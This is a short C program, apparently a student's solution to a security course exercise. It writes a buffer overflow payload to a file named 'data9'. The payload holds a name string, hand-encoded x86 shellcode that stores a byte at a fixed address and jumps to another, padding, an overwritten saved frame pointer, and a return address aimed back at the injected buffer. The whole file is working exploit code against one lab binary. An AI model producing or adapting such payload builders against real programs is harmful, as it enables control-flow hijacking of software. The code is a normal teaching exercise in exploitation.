/*
 *  Panagiotis Berberidis
 *  csd4476
 *  
 */
#include <stdio.h>
#include <stdlib.h>


int main() {
    FILE *fp;
    int i = 0;

    fp = fopen("data9", "w");
    if (fp == NULL) {
        fprintf(stderr, "error opening file!");
        exit(1);
    }

    /* inputing name to be printed */
    fputc('P', fp);
    fputc('a', fp);
    fputc('n', fp);
    fputc('o', fp);
    fputc('s', fp);
    fputc('\0', fp);

    fputc(0xc6, fp);
    fputc(0x05, fp);        /* movb $0x39, 0x80e3068 */
    fputc(0x68, fp);
    fputc(0x30, fp);

    fputc(0x0e, fp);    
    fputc(0x08, fp);
    fputc(0x39, fp);
    fputc(0xb8, fp);

    fputc(0x95, fp);
    fputc(0x9e, fp);        /* movl $0x08049e95, %eax */
    fputc(0x04, fp);
    fputc(0x08, fp);

    fputc(0xff, fp);        /* jmp *%eax */
    fputc(0xe0, fp);    

 
    /* filling up rest of buffer with trash and c some of the ebp bytes */
    for (i = 0; i < 22; i++) {
    if (i == 11) {
        fputc(35, fp); /* keep i after the input */
    }
        fputc(0, fp);
    }

    /* ebp address */
    fputc(0x4e, fp);
    fputc(0xff, fp);
    fputc(0xff, fp);
    fputc(0xe, fp);

    /* return address */
    fputc(0xe5, fp);
    fputc(0x42, fp);
    fputc(0x0e, fp);
    fputc(0x8, fp);

    /* Name address */
    fputc(0xdc, fp);
    fputc(0x42, fp);
    fputc(0xe, fp);
    fputc(0x8, fp);

    fprintf(fp, "\n");
    fclose(fp);

    return 0;
}